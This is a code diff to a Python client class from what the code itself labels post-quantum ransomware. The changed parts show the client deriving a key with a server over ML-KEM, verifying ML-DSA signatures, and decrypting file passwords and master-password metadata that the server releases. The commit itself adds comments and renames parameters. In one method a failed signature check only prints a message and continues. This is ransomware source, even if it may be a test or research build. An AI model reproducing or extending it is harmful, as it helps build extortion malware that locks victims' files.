@@ -9,13 +9,15 @@ from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from pqcrypto.kem.ml_kem_1024 import encrypt
 from pqcrypto.sign.ml_dsa_87 import verify
 
-DICTIONARY_PATH = "/usr/share/dict/words"
-DIRECTORY_NAME = "test"
+DICTIONARY_PATH = (
+    "/usr/share/dict/words"  # Path to dictionary file for random password selection
+)
+DIRECTORY_NAME = "test"  # Directory containing files to encrypt/decrypt
 ID_SIZE = 4  # Size of the file ID in bytes
-SALT_SIZE = 16  # Size of the salt for Argon2id
-IV_SIZE = 12  # AES-GCM standard IV size (96 bits)
-TAG_SIZE = 16  # AES-GCM standard tag size (128 bits)
-KEY_SIZE = 32  # 256 bits for AES-256
+SALT_SIZE = 16  # Recommended salt size for Argon2id
+IV_SIZE = 12  # Recommended IV size for AES-GCM
+TAG_SIZE = 16  # Authentication tag size for AES-GCM
+KEY_SIZE = 32  # Key size for AES-256
 
 
 class Client:
@@ -37,7 +39,7 @@ class Client:
 
         self.server_kem_public_key = server_kem_public_key
         self.server_sign_public_key = server_sign_public_key
-        self.root_metadata_file_name = str(uuid.uuid4())
+        self.root_metadata_file_name = str(uuid.uuid4())  # Unique metadata file name
 
     def establish_shared_secret(self) -> tuple[bytes, bytes]:
         """
@@ -64,7 +66,7 @@ class Client:
         hkdf = HKDF(
             algorithm=hashes.SHA256(),
             length=KEY_SIZE,
-            salt=None,
+            salt=None,  # RFC 5869
             info=b"Post-quantum ransomware communication key",
         )
 
@@ -198,28 +200,28 @@ class Client:
         return password
 
     def decrypt_file_with_password(
-        self, file_path: str, encrypted_data: bytes, signature: bytes
+        self, file_path: str, server_data: bytes, signature: bytes
     ):
         """
-        Decrypt a file using a password.
+        Decrypt a file using the password sent by the server.
 
         :param self: The Client instance.
         :param file_path: The path to the encrypted file.
-        :param encrypted_data: The encrypted password sent by the server.
+        :param server_data: The encrypted password sent by the server.
         :param signature: The signature of the encrypted data.
         :return: None
         """
 
         # Verify the signature
-        if not verify(self.server_sign_public_key, encrypted_data, signature):
+        if not verify(self.server_sign_public_key, server_data, signature):
             raise Exception("Invalid signature.")
         else:
             print("Signature verified successfully.")
 
-        # Decrypt the password sent by the server
-        data_iv = encrypted_data[:IV_SIZE]
-        data_tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
-        data_ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
+        # Decrypt the data sent by the server
+        data_iv = server_data[:IV_SIZE]
+        data_tag = server_data[IV_SIZE : IV_SIZE + TAG_SIZE]
+        data_ciphertext = server_data[IV_SIZE + TAG_SIZE :]
         password = self.decrypt(
             self.communication_key, data_iv, data_tag, data_ciphertext
         ).decode("utf-8")
@@ -321,26 +323,26 @@ class Client:
 
         return data_iv + data_tag + data_ciphertext
 
-    def decrypt_files(self, encrypted_data: bytes, signature: bytes):
+    def decrypt_files(self, server_data: bytes, signature: bytes):
         """
         Decrypt all files in the specified directory using the master password.
 
         :param self: The Client instance.
-        :param encrypted_data: The master password sent by the server.
+        :param server_data: The encrypted master password sent by the server.
         :param signature: The signature of the encrypted data.
         :return: None
         """
 
         # Verify the signature
-        if not verify(self.server_sign_public_key, encrypted_data, signature):
+        if not verify(self.server_sign_public_key, server_data, signature):
             raise Exception("Invalid signature.")
         else:
             print("Signature verified successfully.")
 
         # Decrypt the master password sent by the server
-        iv = encrypted_data[:IV_SIZE]
-        tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
-        ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
+        iv = server_data[:IV_SIZE]
+        tag = server_data[IV_SIZE : IV_SIZE + TAG_SIZE]
+        ciphertext = server_data[IV_SIZE + TAG_SIZE :]
         master_password = self.decrypt(
             self.communication_key, iv, tag, ciphertext
         ).decode("utf-8")
@@ -405,7 +407,7 @@ class Client:
         Get the metadata and the new password required to change the master password.
 
         :param self: The Client instance.
-        :return: The encrypted master password metadata and the new password to send to the server.
+        :return: The encrypted master password metadata and new password to send to the server.
         :rtype: bytes
         """
 
@@ -435,29 +437,31 @@ class Client:
 
         return data_iv + data_tag + data_ciphertext
 
-    def change_master_password_metadata(self, encrypted_data: bytes, signature: bytes):
+    def change_master_password_metadata(self, server_data: bytes, signature: bytes):
         """
-        Update the master password metadata in the metadata file.
+        Update the master password metadata with the new metadata sent by the server.
 
         :param self: The Client instance.
-        :param encrypted_data: The encrypted master password metadata sent by the server.
+        :param server_data: The encrypted master password metadata sent by the server.
         :param signature: The signature of the encrypted data.
         :return: None
         """
 
         # Verify the signature
-        if not verify(self.server_sign_public_key, encrypted_data, signature):
+        if not verify(self.server_sign_public_key, server_data, signature):
             print("Invalid signature.")
         else:
             print("Signature verified successfully.")
 
         # Decrypt the master password metadata sent by the server
-        data_iv = encrypted_data[:IV_SIZE]
-        data_tag = encrypted_data[IV_SIZE : IV_SIZE + TAG_SIZE]
-        data_ciphertext = encrypted_data[IV_SIZE + TAG_SIZE :]
+        data_iv = server_data[:IV_SIZE]
+        data_tag = server_data[IV_SIZE : IV_SIZE + TAG_SIZE]
+        data_ciphertext = server_data[IV_SIZE + TAG_SIZE :]
         metadata = self.decrypt(
             self.communication_key, data_iv, data_tag, data_ciphertext
         )
+
+        # Parse the metadata
         master_password_salt = metadata[:SALT_SIZE]
         root_key_iv = metadata[SALT_SIZE : SALT_SIZE + IV_SIZE]
         root_key_tag = metadata[SALT_SIZE + IV_SIZE : SALT_SIZE + IV_SIZE + TAG_SIZE]
